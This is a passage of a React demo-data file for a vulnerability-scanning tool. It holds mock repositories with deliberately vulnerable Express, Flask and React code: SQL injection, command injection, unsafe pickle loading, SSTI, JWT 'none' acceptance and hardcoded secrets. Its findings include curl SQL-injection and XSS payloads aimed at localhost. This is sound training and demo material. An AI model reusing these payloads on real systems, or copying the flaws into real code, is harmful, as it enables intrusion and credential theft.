"use client";

import React, { createContext, useContext, useState, useCallback, useEffect } from 'react';
import { usePathname } from '@/i18n/navigation';
import { isDemoPath, clearDemoStorage, DEMO_STORAGE_PREFIX } from '@/lib/demo-mode';

const DemoContext = createContext();

// =============================================
// DEMO GITHUB REPOSITORIES
// =============================================
const DEMO_GITHUB_REPOS = [
    {
        id: 1001,
        name: "vulnerable-express-app",
        full_name: "demo-org/vulnerable-express-app",
        description: "Express.js application with intentional security vulnerabilities for testing",
        private: false,
        language: "JavaScript",
        stargazers_count: 245,
        updated_at: "2024-12-15T10:30:00Z",
        default_branch: "main",
        provider: "github",
    },
    {
        id: 1002,
        name: "insecure-flask-api",
        full_name: "demo-org/insecure-flask-api",
        description: "Python Flask REST API with common security flaws for educational purposes",
        private: false,
        language: "Python",
        stargazers_count: 189,
        updated_at: "2024-12-10T14:22:00Z",
        default_branch: "main",
        provider: "github",
    },
    {
        id: 1003,
        name: "legacy-java-webapp",
        full_name: "demo-org/legacy-java-webapp",
        description: "Legacy Java Spring application with outdated dependencies and security issues",
        private: true,
        language: "Java",
        stargazers_count: 67,
        updated_at: "2024-12-08T09:15:00Z",
        default_branch: "master",
        provider: "github",
    },
    {
        id: 1004,
        name: "react-auth-example",
        full_name: "demo-org/react-auth-example",
        description: "React frontend with authentication vulnerabilities for security training",
        private: false,
        language: "TypeScript",
        stargazers_count: 412,
        updated_at: "2024-12-20T16:45:00Z",
        default_branch: "main",
        provider: "github",
    },
    {
        id: 1005,
        name: "dotnet-ecommerce",
        full_name: "demo-org/dotnet-ecommerce",
        description: ".NET e-commerce platform with payment processing vulnerabilities",
        private: true,
        language: "C#",
        stargazers_count: 156,
        updated_at: "2024-12-18T11:30:00Z",
        default_branch: "develop",
        provider: "github",
    },
    {
        id: 1006,
        name: "node-microservices",
        full_name: "demo-org/node-microservices",
        description: "Microservices architecture with API gateway security vulnerabilities",
        private: false,
        language: "JavaScript",
        stargazers_count: 328,
        updated_at: "2024-12-22T08:15:00Z",
        default_branch: "main",
        provider: "github",
    },
];

// =============================================
// DEMO GITLAB REPOSITORIES
// =============================================
const DEMO_GITLAB_REPOS = [
    {
        id: 2001,
        name: "php-cms-demo",
        full_name: "demo-group/php-cms-demo",
        description: "PHP content management system with SQL injection and XSS vulnerabilities",
        private: false,
        language: "PHP",
        star_count: 98,
        last_activity_at: "2024-12-12T08:20:00Z",
        default_branch: "main",
        provider: "gitlab",
    },
    {
        id: 2002,
        name: "go-microservices",
        full_name: "demo-group/go-microservices",
        description: "Go microservices with API security issues and improper authentication",
        private: true,
        language: "Go",
        star_count: 234,
        last_activity_at: "2024-12-19T15:10:00Z",
        default_branch: "main",
        provider: "gitlab",
    },
    {
        id: 2003,
        name: "ruby-rails-blog",
        full_name: "demo-group/ruby-rails-blog",
        description: "Ruby on Rails blog application with mass assignment vulnerabilities",
        private: false,
        language: "Ruby",
        star_count: 145,
        last_activity_at: "2024-12-14T12:00:00Z",
        default_branch: "main",
        provider: "gitlab",
    },
    {
        id: 2004,
        name: "django-elearning",
        full_name: "demo-group/django-elearning",
        description: "Django e-learning platform with IDOR and authentication flaws",
        private: false,
        language: "Python",
        star_count: 187,
        last_activity_at: "2024-12-21T09:30:00Z",
        default_branch: "main",
        provider: "gitlab",
    },
];

// =============================================
// DEMO PROJECT STRUCTURES (Multiple Projects)
// =============================================

// Project 1: Vulnerable Express App (JavaScript)
const DEMO_PROJECT_EXPRESS = {
    name: "vulnerable-express-app",
    type: "directory",
    children: [
        {
            name: "src",
            type: "directory",
            children: [
                {
                    name: "index.js",
                    type: "file",
                    content: `const express = require('express');
const mysql = require('mysql');
const app = express();

// Vulnerable: No input sanitization
app.get('/users', (req, res) => {
    const userId = req.query.id;
    
    // SQL Injection vulnerability - user input directly in query
    const query = "SELECT * FROM users WHERE id = " + userId;
    
    connection.query(query, (err, results) => {
        if (err) {
            res.status(500).send(err.message);
        }
        res.json(results);
    });
});

// Vulnerable: XSS - No output encoding
app.get('/profile', (req, res) => {
    const username = req.query.name;
    
    // XSS vulnerability - unescaped user input in HTML
    res.send(\`
        <html>
            <body>
                <h1>Welcome, \${username}!</h1>
                <p>Your profile page</p>
            </body>
        </html>
    \`);
});

// Vulnerable: Path Traversal
app.get('/files', (req, res) => {
    const filename = req.query.file;
    
    // Path traversal vulnerability - no validation
    const filepath = './uploads/' + filename;
    res.sendFile(filepath);
});

// Vulnerable: Hardcoded credentials
const dbConfig = {
    host: 'localhost',
    user: 'admin',
    password: 'password123', // Hardcoded secret
    database: 'myapp'
};

const connection = mysql.createConnection(dbConfig);

app.listen(3000, () => {
    console.log('Server running on port 3000');
});`,
                },
                {
                    name: "routes",
                    type: "directory",
                    children: [
                        {
                            name: "users.js",
                            type: "file",
                            content: `// User routes with SQL injection vulnerability
const express = require('express');
const router = express.Router();

router.get('/:id', (req, res) => {
    const query = "SELECT * FROM users WHERE id = " + req.params.id;
    db.query(query, (err, result) => {
        res.json(result);
    });
});

router.post('/search', (req, res) => {
    const { name } = req.body;
    const query = \`SELECT * FROM users WHERE name LIKE '%\${name}%'\`;
    db.query(query, (err, result) => {
        res.json(result);
    });
});

module.exports = router;`,
                        },
                        {
                            name: "auth.js",
                            type: "file",
                            content: `// Authentication routes with security issues
const express = require('express');
const router = express.Router();
const crypto = require('crypto');

router.post('/login', (req, res) => {
    const { username, password } = req.body;
    
    // VULNERABLE: Using MD5 - cryptographically weak
    const hash = crypto.createHash('md5').update(password).digest('hex');
    
    const user = users.find(u => u.username === username);
    if (user && user.passwordHash === hash) {
        req.session.userId = user.id;
        res.json({ success: true });
    } else {
        res.status(401).json({ error: 'Invalid credentials' });
    }
});

module.exports = router;`,
                        },
                        {
                            name: "admin.js",
                            type: "file",
                            content: `// Admin routes with authorization issues
const express = require('express');
const router = express.Router();

// VULNERABLE: Missing authorization check
router.get('/users', (req, res) => {
    db.query('SELECT * FROM users', (err, result) => {
        res.json(result);
    });
});

// VULNERABLE: IDOR
router.delete('/user/:id', (req, res) => {
    const { id } = req.params;
    db.query('DELETE FROM users WHERE id = ?', [id], (err) => {
        res.json({ deleted: true });
    });
});

module.exports = router;`,
                        },
                    ],
                },
                {
                    name: "utils",
                    type: "directory",
                    children: [
                        {
                            name: "database.js",
                            type: "file",
                            content: `const mysql = require('mysql');

const connection = mysql.createConnection({
    host: process.env.DB_HOST || 'localhost',
    user: 'root',
    password: 'admin123', // SECURITY ISSUE: Hardcoded password
    database: 'production_db'
});

module.exports = connection;`,
                        },
                        {
                            name: "crypto.js",
                            type: "file",
                            content: `const crypto = require('crypto');

// VULNERABLE: Weak encryption
const ALGORITHM = 'des-ecb';
const KEY = 'mysecret';

function encrypt(text) {
    const cipher = crypto.createCipheriv(ALGORITHM, KEY, null);
    return cipher.update(text, 'utf8', 'hex') + cipher.final('hex');
}

function generateToken() {
    return Math.random().toString(36).substring(2);
}

module.exports = { encrypt, generateToken };`,
                        },
                    ],
                },
                {
                    name: "middleware",
                    type: "directory",
                    children: [
                        {
                            name: "auth.js",
                            type: "file",
                            content: `const jwt = require('jsonwebtoken');

const JWT_SECRET = 'super-secret-key-123';

function verifyToken(req, res, next) {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token) return res.status(401).json({ error: 'No token' });
    
    try {
        req.user = jwt.verify(token, JWT_SECRET);
        next();
    } catch (err) {
        res.status(401).json({ error: 'Invalid token' });
    }
}

module.exports = { verifyToken };`,
                        },
                    ],
                },
            ],
        },
        {
            name: "config",
            type: "directory",
            children: [
                {
                    name: "secrets.js",
                    type: "file",
                    content: `// VULNERABLE: Secrets in source code
module.exports = {
    AWS_ACCESS_KEY: 'AKIA_EXAMPLE_KEY_HERE',
    AWS_SECRET_KEY: 'example_secret_key_replace_me_in_production',
    JWT_SECRET: 'super-secret-jwt-key-do-not-share'
};`,
                },
            ],
        },
        {
            name: "package.json",
            type: "file",
            content: `{
  "name": "vulnerable-express-app",
  "version": "1.0.0",
  "dependencies": {
    "express": "^4.18.2",
    "mysql": "^2.18.1",
    "jsonwebtoken": "^8.5.1"
  }
}`,
        },
        {
            name: "README.md",
            type: "file",
            content: `# Vulnerable Express App

Demo application with security vulnerabilities for VulnIQ.

## Vulnerabilities
1. SQL Injection
2. XSS
3. Path Traversal
4. Hardcoded Credentials
5. Weak Cryptography
`,
        },
        {
            name: "unformatted.js",
            type: "file",
            content: `// This file has bad formatting - try the Format button!
const express=require('express');const app=express();const users=[{id:1,name:'John',email:'john@example.com'},{id:2,name:'Jane',email:'jane@example.com'},{id:3,name:'Bob',email:'bob@example.com'}];
app.get('/api/users',(req,res)=>{const{search,limit,offset}=req.query;let result=users;if(search){result=result.filter(u=>u.name.toLowerCase().includes(search.toLowerCase())||u.email.toLowerCase().includes(search.toLowerCase()));}if(limit){result=result.slice(offset||0,parseInt(limit)+(offset||0));}res.json({data:result,total:users.length,filtered:result.length});});
app.post('/api/users',(req,res)=>{const{name,email}=req.body;if(!name||!email){return res.status(400).json({error:'Name and email required'});}const newUser={id:users.length+1,name,email};users.push(newUser);res.status(201).json(newUser);});
app.put('/api/users/:id',(req,res)=>{const id=parseInt(req.params.id);const user=users.find(u=>u.id===id);if(!user){return res.status(404).json({error:'User not found'});}const{name,email}=req.body;if(name)user.name=name;if(email)user.email=email;res.json(user);});
app.delete('/api/users/:id',(req,res)=>{const id=parseInt(req.params.id);const index=users.findIndex(u=>u.id===id);if(index===-1){return res.status(404).json({error:'User not found'});}users.splice(index,1);res.status(204).send();});
app.listen(3000,()=>console.log('Server running'));`,
        },
    ],
};

// Project 2: Insecure Flask API (Python)
const DEMO_PROJECT_FLASK = {
    name: "insecure-flask-api",
    type: "directory",
    children: [
        {
            name: "app",
            type: "directory",
            children: [
                {
                    name: "__init__.py",
                    type: "file",
                    content: `from flask import Flask
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)
app.config['DEBUG'] = True
app.config['SECRET_KEY'] = 'dev'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///production.db'

db = SQLAlchemy(app)

from app import routes, models`,
                },
                {
                    name: "routes.py",
                    type: "file",
                    content: `from flask import Flask, request, jsonify, render_template_string
from app import app, db
import pickle
import subprocess

@app.route('/api/users/search')
def search_users():
    query = request.args.get('q', '')
    # SQL Injection
    result = db.engine.execute(f"SELECT * FROM users WHERE name LIKE '%{query}%'")
    return jsonify([dict(row) for row in result])

@app.route('/api/ping')
def ping():
    host = request.args.get('host', 'localhost')
    # Command Injection
    output = subprocess.check_output(f'ping -c 1 {host}', shell=True)
    return output

@app.route('/api/session', methods=['POST'])
def load_session():
    data = request.get_data()
    # Insecure Deserialization
    session_data = pickle.loads(data)
    return jsonify(session_data)

@app.route('/api/greeting')
def greeting():
    name = request.args.get('name', 'World')
    # SSTI
    template = f'<h1>Hello {name}!</h1>'
    return render_template_string(template)`,
                },
                {
                    name: "models.py",
                    type: "file",
                    content: `from app import db
from werkzeug.security import generate_password_hash

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True)
    email = db.Column(db.String(120), unique=True)
    password_hash = db.Column(db.String(128))
    is_admin = db.Column(db.Boolean, default=False)
    
    def set_password(self, password):
        # VULNERABLE: Weak hash
        self.password_hash = generate_password_hash(password, method='md5')
    
    def to_dict(self):
        # VULNERABLE: Exposes password_hash
        return {
            'id': self.id,
            'username': self.username,
            'email': self.email,
            'password_hash': self.password_hash
        }`,
                },
                {
                    name: "auth.py",
                    type: "file",
                    content: `from flask import request, jsonify
from functools import wraps
import jwt

SECRET_KEY = 'flask-secret-key'

def create_token(user_id):
    return jwt.encode({'user_id': user_id}, SECRET_KEY, algorithm='HS256')

def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization')
        if not token:
            return jsonify({'error': 'Token required'}), 401
        try:
            data = jwt.decode(token, SECRET_KEY, algorithms=['HS256', 'none'])
            return f(data['user_id'], *args, **kwargs)
        except:
            return jsonify({'error': 'Invalid token'}), 401
    return decorated`,
                },
            ],
        },
        {
            name: "config.py",
            type: "file",
            content: `class Config:
    SECRET_KEY = 'super-secret-flask-key'
    SQLALCHEMY_DATABASE_URI = 'postgresql://admin:password123@localhost/production'
    DEBUG = True
    WTF_CSRF_ENABLED = False
    AWS_ACCESS_KEY_ID = 'your-aws-access-key-here'
    AWS_SECRET_ACCESS_KEY = 'your-aws-secret-key-here'`,
        },
        {
            name: "requirements.txt",
            type: "file",
            content: `Flask==1.1.2
Flask-SQLAlchemy==2.5.1
PyJWT==1.7.1
Werkzeug==1.0.1
requests==2.25.0`,
        },
        {
            name: "run.py",
            type: "file",
            content: `from app import app

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)`,
        },
        {
            name: "unformatted.py",
            type: "file",
            content: `#    This file has bad formatting - try the Format button!
import    os
import sys
import      json
from typing import Dict,List,Optional,Any,Union,Callable


class    UserManager:
        """Manages users in the system."""
        def __init__(    self,db_path:str,cache_enabled   :bool=True,max_cache_size:   int=1000   ):
                        self.db_path=db_path
                        self.cache_enabled    =cache_enabled
                        self.max_cache_size=    max_cache_size
                        self.cache={       }
                        self.stats={   'hits':0,    'misses':0}



        def get_user(  self,   user_id:int  )   ->Optional[   Dict[str,Any]]:
                        if self.cache_enabled    and     user_id in self.cache:
                                    self.stats[   'hits']+=1
                                    return    self.cache[user_id]
                        self.stats['misses'   ]+=1
                        user   =self._fetch_from_db(   user_id)
                        if user    and self.cache_enabled:
                                    self.cache[user_id]   =user
                        return    user


        def _fetch_from_db(self,user_id   :int)->   Optional[Dict[str   ,Any]]:
                        data={   'id':user_id,'name':f'User{user_id}',
                        'email'   :f'user{user_id}@example.com',
                                    'active':True,'role':'user',
                        'created_at':'2024-01-01'   }
                        return    data
        def create_user(   self,  name:str,email   :str,  role   :str='user'   )->Dict[str,Any]:
                        user_id=len(   self.cache)+1
                        user={    'id':user_id,   'name':name,'email':   email,
'role':role,'active'   :True}
                        self.cache[   user_id]=user
                        return   user



        def update_user( self,user_id:int,    **kwargs   )->Optional[Dict[   str,Any]]:
                        user=self.get_user(   user_id   )
                        if    not user:
                                    return    None
                        for   key,  value   in kwargs.items():
                                    if key    in user:
                                                user[   key]=value
                        return   user
        def delete_user(self   ,user_id:int   )->   bool:
                        if user_id   in self.cache:
                                    del    self.cache[user_id]
                                    return   True
                        return   False
        def list_users(self,active_only   :bool=False)->List[   Dict[str,   Any]]:
                        users   =list(self.cache.values(   ))
                        if    active_only:
                                    return[u    for u   in users   if u.get(   'active',True)]
                        return   users


if __name__   =='__main__':
        manager   =UserManager(   '/tmp/users.db')
        manager.create_user('Alice'   ,'alice@example.com')
        manager.create_user(    'Bob','bob@example.com',   'admin')
        users=   manager.list_users()
        print(   json.dumps(   users,indent=2))`,
        },
    ],
};

// Project 3: React Auth Example (TypeScript)
const DEMO_PROJECT_REACT = {
    name: "react-auth-example",
    type: "directory",
    children: [
        {
            name: "src",
            type: "directory",
            children: [
                {
                    name: "App.tsx",
                    type: "file",
                    content: `import React from 'react';
import { BrowserRouter, Routes, Route } from 'react-router-dom';
import Login from './components/Login';
import Dashboard from './components/Dashboard';

function App() {
  return (
    <BrowserRouter>
      <Routes>
        <Route path="/login" element={<Login />} />
        {/* VULNERABLE: No auth check */}
        <Route path="/dashboard" element={<Dashboard />} />
        <Route path="/admin" element={<AdminPanel />} />
      </Routes>
    </BrowserRouter>
  );
}

export default App;`,
                },
                {
                    name: "components",
                    type: "directory",
                    children: [
                        {
                            name: "Login.tsx",
                            type: "file",
                            content: `import React, { useState } from 'react';

export default function Login() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const response = await fetch('/api/login', {
      method: 'POST',
      body: JSON.stringify({ username, password })
    });
    const data = await response.json();
    
    // VULNERABLE: Token in localStorage
    localStorage.setItem('token', data.token);
    localStorage.setItem('user', JSON.stringify(data.user));
    window.location.href = '/dashboard';
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <input type="text" value={username} onChange={(e) => setUsername(e.target.value)} />
      <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} />
      <button type="submit">Login</button>
    </form>
  );
}`,
                        },
                        {
                            name: "Dashboard.tsx",
                            type: "file",
                            content: `import React, { useEffect, useState } from 'react';

export default function Dashboard() {
  const [messages, setMessages] = useState<string[]>([]);
  
  useEffect(() => {
    const user = JSON.parse(localStorage.getItem('user') || '{}');
    fetchMessages();
  }, []);
  
  // VULNERABLE: XSS via dangerouslySetInnerHTML
  const renderMessage = (msg: string) => {
    return <div dangerouslySetInnerHTML={{ __html: msg }} />;
  };
  
  return (
    <div>
      {messages.map((msg, i) => renderMessage(msg))}
    </div>
  );
}`,
                        },
                        {
                            name: "UserProfile.tsx",
                            type: "file",
                            content: `import React, { useState, useEffect } from 'react';

export default function UserProfile() {
  const [url, setUrl] = useState('');
  
  // VULNERABLE: Open Redirect
  const handleRedirect = () => {
    window.location.href = url;
  };
  
  // VULNERABLE: postMessage without origin check
  useEffect(() => {
    window.addEventListener('message', (event) => {
      const data = event.data;
      if (data.type === 'UPDATE_PROFILE') {
        updateProfile(data.profile);
      }
    });
  }, []);
  
  return (
    <div>
      <input value={url} onChange={(e) => setUrl(e.target.value)} />
      <button onClick={handleRedirect}>Go</button>
    </div>
  );
}`,
                        },
                    ],
                },
                {
                    name: "api",
                    type: "directory",
                    children: [
                        {
                            name: "config.ts",
                            type: "file",
                            content: `// VULNERABLE: API keys in frontend
export const API_CONFIG = {
  apiKey: 'your-api-key-here',
  googleMapsKey: 'your-google-maps-key-here',
  stripeSecretKey: 'your-stripe-key-here',
  firebaseConfig: {
    apiKey: "your-firebase-key-here",
    authDomain: "myapp.firebaseapp.com"
  }
};`,
                        },
                    ],
                },
            ],
        },
        {
            name: "package.json",
            type: "file",
            content: `{
  "name": "react-auth-example",
  "version": "1.0.0",
  "dependencies": {
    "react": "^18.2.0",
    "react-dom": "^18.2.0",
    "react-router-dom": "^6.8.0"
  }
}`,
        },
        {
            name: "unformatted.tsx",
            type: "file",
            content: `// This file has bad formatting - try the Format button!
import React,{useState,useEffect,useCallback,useMemo}from'react';interface User{id:number;name:string;email:string;role:'admin'|'user'|'guest';active:boolean;createdAt:Date}interface UserListProps{users:User[];onSelect:(user:User)=>void;onDelete:(id:number)=>void;showInactive?:boolean}
const UserList:React.FC<UserListProps>=({users,onSelect,onDelete,showInactive=false})=>{const[filter,setFilter]=useState('');const[sortBy,setSortBy]=useState<keyof User>('name');const[sortDir,setSortDir]=useState<'asc'|'desc'>('asc')
const filteredUsers=useMemo(()=>{let result=users.filter(u=>showInactive||u.active);if(filter){result=result.filter(u=>u.name.toLowerCase().includes(filter.toLowerCase())||u.email.toLowerCase().includes(filter.toLowerCase()))}return result.sort((a,b)=>{const aVal=a[sortBy];const bVal=b[sortBy];if(aVal<bVal)return sortDir==='asc'?-1:1;if(aVal>bVal)return sortDir==='asc'?1:-1;return 0})},[users,filter,sortBy,sortDir,showInactive])
const handleSort=useCallback((field:keyof User)=>{if(sortBy===field){setSortDir(d=>d==='asc'?'desc':'asc')}else{setSortBy(field);setSortDir('asc')}},[sortBy])
return(<div className="user-list"><input type="text"placeholder="Search users..."value={filter}onChange={e=>setFilter(e.target.value)}className="search-input"/><table><thead><tr><th onClick={()=>handleSort('name')}>Name{sortBy==='name'&&(sortDir==='asc'?'↑':'↓')}</th><th onClick={()=>handleSort('email')}>Email</th><th onClick={()=>handleSort('role')}>Role</th><th>Actions</th></tr></thead><tbody>{filteredUsers.map(user=>(<tr key={user.id}onClick={()=>onSelect(user)}className={user.active?'':'inactive'}><td>{user.name}</td><td>{user.email}</td><td>{user.role}</td><td><button onClick={e=>{e.stopPropagation();onDelete(user.id)}}>Delete</button></td></tr>))}</tbody></table></div>)}
export default UserList`,
        },
    ],
};

// All demo projects map
const DEMO_PROJECTS = {
    "demo-org/vulnerable-express-app": DEMO_PROJECT_EXPRESS,
    "demo-org/insecure-flask-api": DEMO_PROJECT_FLASK,
    "demo-org/react-auth-example": DEMO_PROJECT_REACT,
    "demo-group/php-cms-demo": DEMO_PROJECT_EXPRESS,
    "demo-group/go-microservices": DEMO_PROJECT_FLASK,
    "demo-group/ruby-rails-blog": DEMO_PROJECT_REACT,
};

// Default demo code and project
const DEMO_CODE = DEMO_PROJECT_EXPRESS.children
    .find(c => c.name === "src")?.children
    .find(c => c.name === "index.js")?.content || "";

const DEMO_PROJECT_STRUCTURE = DEMO_PROJECT_EXPRESS;

// =============================================
// DEMO VULNERABILITY MAP (filePath → Vulnerability[])
// Maps to the DEMO_PROJECT_EXPRESS file structure
// =============================================
const DEMO_VULNERABILITIES = {
    "src/index.js": [
        {
            id: "demo-vuln-1",
            severity: "Critical",
            title: "SQL Injection",
            cweId: "CWE-89",
            lineNumber: 10,
            confidence: 0.97,
            cvssScore: 9.8,
            vulnerableCode: `// src/index.js — lines 7-13
app.get('/users', (req, res) => {
    const userId = req.query.id;

    // SQL Injection vulnerability - user input directly in query
    const query = "SELECT * FROM users WHERE id = " + userId;

    connection.query(query, (err, results) => {
        if (err) { res.status(500).send(err.message); }
        res.json(results);
    });
});`,
            explanation: "User input `req.query.id` is concatenated directly into the SQL query string without parameterisation. An attacker can inject arbitrary SQL, leading to data exfiltration or database destruction.",
            bestPractices: "Use parameterised queries or prepared statements: `connection.query('SELECT * FROM users WHERE id = ?', [userId], ...)`",
            details: "SQL Injection via unsanitised query parameter",
            cvssVector: "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
            cvssAnalysis: {
                AV: "The endpoint is exposed over HTTP with no network-level restrictions. Any internet-connected attacker can reach /users?id= without any prior access.",
                AC: "Exploitation requires no special conditions or timing. The injection payload can be crafted and delivered in a single HTTP request with predictable results.",
                AT: "No preparatory actions are required. The attacker does not need an existing session, specific configuration, or any preconditions.",
                PR: "The route is unauthenticated. No login or privilege is required to send the malicious query parameter.",
                UI: "No user interaction is needed. The attacker directly interacts with the server API without any victim involvement.",
                VC: "Full database confidentiality is lost. All tables accessible to the application's DB user — including users, sessions, and PII — can be extracted.",
                VI: "An attacker can INSERT, UPDATE, or DELETE records, enabling account takeover, data tampering, or destruction of application state.",
                VA: "Destructive SQL commands (DROP TABLE, DELETE FROM users) can render the application inoperable. A full data wipe is possible.",
            },
            documentReferences: [
                {
                    documentTitle: "OWASP SQL Injection Prevention Cheat Sheet",
                    pageNumber: 3,
                    relevantExcerpt: "The use of parameterized queries (also known as prepared statements) is the most effective defense against SQL injection attacks. Parameterized queries ensure that an attacker is not able to change the intent of a query.",
                    relevanceNote: "Directly applicable to the `connection.query()` call at line 10 — replace string concatenation with a parameterized `?` placeholder.",
                },
                {
                    documentTitle: "Node.js Security Best Practices — mysql2 Driver",
                    pageNumber: 12,
                    relevantExcerpt: "`connection.execute('SELECT * FROM users WHERE id = ?', [userId])` automatically escapes values and prevents injection. Never use template literals in SQL queries.",
                    relevanceNote: "Provides the exact replacement API for the vulnerable pattern detected in src/index.js.",
                },
                {
                    documentTitle: "PCI DSS v4.0 — Requirement 6.2: Bespoke and Custom Software Security",
                    pageNumber: 47,
                    relevantExcerpt: "All bespoke and custom software is protected from common vulnerabilities, including SQL injection (CWE-89), by review or automated testing before deployment.",
                    relevanceNote: "This finding directly violates PCI DSS Req 6.2.4. If payment data is accessible via the compromised database, this constitutes a reportable breach.",
                },
            ],
            exploitSections: [
                {
                    heading: "Reconnaissance — Identify Injection Point",
                    text: "Begin by probing the `/users?id=` parameter with a simple boolean payload. A valid response confirms the parameter is not sanitized.",
                    code: `# Boolean-based detection — returns all users if vulnerable
curl "http://localhost:3000/users?id=1 OR 1=1--"

# Expected: full user list returned (not just user id=1)`,
                    language: "bash",
                },
                {
                    heading: "Schema Enumeration — Extract Table Names",
                    text: "Once injection is confirmed, use a UNION SELECT to read from `information_schema` and map the database structure.",
                    code: `# UNION-based extraction — enumerate tables
curl "http://localhost:3000/users?id=0 UNION SELECT table_name,2,3 FROM information_schema.tables--"

# Response (truncated):
# [{"table_name":"users"},{"table_name":"sessions"},{"table_name":"orders"}]`,
                    language: "bash",
                },
                {
                    heading: "Data Exfiltration — Dump Credentials",
                    text: "With the schema known, dump the `users` table to obtain plaintext or hashed credentials for offline cracking.",
                    code: `# Dump username + password_hash + email in one request
curl "http://localhost:3000/users?id=0 UNION SELECT username,password,email FROM users--"

# Response:
# [
#   {"username":"admin","password":"$2b$10$abc...","email":"admin@corp.com"},
#   {"username":"alice","password":"$2b$10$xyz...","email":"alice@corp.com"}
# ]`,
                    language: "bash",
                },
                {
                    heading: "Blind Injection — Time-Based Verification",
                    text: "In environments where output is suppressed, use a time-based payload to confirm exploitability via response delay.",
                    code: `# Time-based blind injection — 5 second delay confirms execution
curl -o /dev/null -w "%{time_total}" \
  "http://localhost:3000/users?id=1; IF (1=1) WAITFOR DELAY '0:0:5'--"

# Output: 5.03 seconds — injection confirmed`,
                    language: "bash",
                },
            ],
            attackPath: `1. Attacker identifies the /users?id= endpoint via reconnaissance
2. Sends malformed input: id=1 OR 1=1-- to test for injection
3. Observes unrestricted data returned — confirms vulnerability
4. Crafts UNION SELECT payload to enumerate database schema
5. Dumps credentials table: username, password_hash, email
6. Cracks or replays password hashes for account takeover`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "req.query.id", description: "Unvalidated user input from HTTP GET parameter" },
                    { id: "n2", type: "intermediate", label: "query string concat", description: "Directly interpolated into SQL string via template literal" },
                    { id: "n3", type: "sink", label: "connection.query()", description: "Raw SQL executed against database — no parameterisation" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "unsanitised" },
                    { from: "n2", to: "n3", label: "injected" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.97,
                rounds: [
                    {
                        id: "r1", round: 1, agentRole: "advocate",
                        argument: "The vulnerability is clearly exploitable. `req.query.id` flows directly into the SQL string via string concatenation with no sanitisation, parameterisation, or input validation. Classic CWE-89. A single crafted request can dump the entire database.",
                        citations: [{ excerpt: "SQL injection flaws occur when user-supplied data is sent to an interpreter as part of a command or query.", source: "OWASP Top 10 — A03:2021" }],
                    },
                    {
                        id: "r2", round: 2, agentRole: "skeptic",
                        argument: "The input might be validated elsewhere in the middleware chain. Could there be an upstream sanitisation layer or ORM wrapping this call that wasn't included in the analysis scope?",
                    },
                    {
                        id: "r3", round: 3, agentRole: "advocate",
                        argument: "No middleware sanitisation is present in the codebase — confirmed by reviewing all middleware registrations in app.js. The raw Express router accesses `req.query.id` directly with no prior transform.",
                    },
                    {
                        id: "r4", round: 4, agentRole: "judge",
                        argument: "Both sides have been heard. The advocate's evidence is conclusive: there is no middleware sanitisation and the injection point is directly exercised. The skeptic raised a valid concern but it was addressed with code evidence. This is a confirmed Critical SQL Injection.",
                        verdict: "confirmed",
                        confidence: 0.97,
                    },
                ],
            },
        },
        {
            id: "demo-vuln-2",
            severity: "High",
            title: "Cross-Site Scripting (XSS)",
            cweId: "CWE-79",
            lineNumber: 25,
            confidence: 0.92,
            cvssScore: 7.4,
            vulnerableCode: `// src/index.js — lines 21-29
app.get('/hello', (req, res) => {
    const username = req.query.username;

    // XSS vulnerability - unescaped user input in HTML
    res.send(\`
        <html><body>
            <h1>Welcome, \${username}!</h1>
        </body></html>
    \`);
});`,
            explanation: "The `username` query parameter is embedded directly into the HTML response without escaping. An attacker can inject `<script>` tags to steal cookies or redirect users.",
            bestPractices: "Escape HTML entities before embedding user input, or use a template engine with auto-escaping enabled.",
            details: "Reflected XSS via unescaped user input in HTML",
            cvssVector: "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:L/VI:L/VA:N/SC:H/SI:H/SA:N",
            cvssAnalysis: {
                AV: "The /hello endpoint is network-accessible with no authentication. Attacker can craft and distribute the malicious URL from anywhere on the internet.",
                AC: "No special conditions are required. The payload is delivered in the URL and reflected on every request. Exploitation is simple and reliable.",
                AT: "No prerequisites — the attacker only needs to craft a URL and distribute it, which requires no prior setup.",
                PR: "The vulnerable endpoint requires no authentication — any visitor receives the reflected payload.",
                UI: "A victim must actively click the crafted link. The attack requires social engineering (phishing email, malicious redirect).",
                VC: "The attacker can access session cookies and tokens from the vulnerable origin — limited to the current user's data.",
                VI: "The injected script can modify the DOM, submit forms on behalf of the user, or perform unauthorized API calls.",
                VA: "Availability of the vulnerable component is not directly impacted by this attack vector.",
                SC: "If session cookies are exfiltrated, the attacker gains access to the victim's full account including all downstream services using SSO.",
                SI: "Account takeover allows the attacker to modify the victim's profile, preferences, or perform privileged actions in the application.",
            },
            documentReferences: [
                {
                    documentTitle: "OWASP XSS Prevention Cheat Sheet",
                    pageNumber: 2,
                    relevantExcerpt: "Output Encoding — When you output data in an HTML context, encode it as HTML entities. This prevents all reflected XSS from user-controlled query parameters in HTML responses.",
                    relevanceNote: "Directly applicable: the `res.send()` call at line 25 must encode `username` before interpolation.",
                },
                {
                    documentTitle: "Content Security Policy (CSP) — Level 3 W3C Specification",
                    pageNumber: 8,
                    relevantExcerpt: "A Content Security Policy is an HTTP response header that allows a site to control the sources from which scripts, styles, and other resources can be loaded.",
                    relevanceNote: "Adding `script-src 'self'` CSP header provides defense-in-depth against this XSS even if encoding is missed elsewhere.",
                },
            ],
            exploitSections: [
                {
                    heading: "Basic PoC — Confirm Script Execution",
                    text: "Verify the injection point by triggering an `alert()`. This confirms the payload executes in the victim's browser context.",
                    code: `# Basic reflected XSS confirmation
curl "http://localhost:3000/hello?username=<script>alert(document.domain)</script>"

# In browser — navigate to:
# http://localhost:3000/hello?username=<script>alert(document.domain)</script>
# Expected: alert dialog shows "localhost"`,
